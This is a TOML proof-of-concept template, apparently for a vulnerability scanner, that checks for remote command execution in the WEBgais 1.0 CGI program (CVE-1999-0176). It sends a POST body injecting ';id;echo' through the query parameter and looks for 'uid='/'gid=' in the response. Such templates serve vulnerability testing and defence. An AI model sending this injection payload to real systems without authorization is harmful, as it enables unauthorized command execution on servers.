[info]
author = "AVE"
description = "WEBgais 1.0 CGI 程序未正确过滤 query 参数中的 shell 元字符，导致远程命令执行。发送包含 ';id;echo' 的 POST 请求，若响应中包含 id 命令输出则存在漏洞。"
id = "POC-AVE-1999-0351"
name = "WEBgais 1.0 远程命令执行漏洞 PoC"
severity = "high"
tags = [
    "cve-1999-0176",
    "webgais",
    "cgi",
    "rce",
]
vuln_id = [
    "CVE-1999-0176",
    "AVE-1999-0351",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/webgais"
protocol = "http"

[poc.requests.body]
content = "query=';id;echo'&output=subject&domain=paragraph"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]
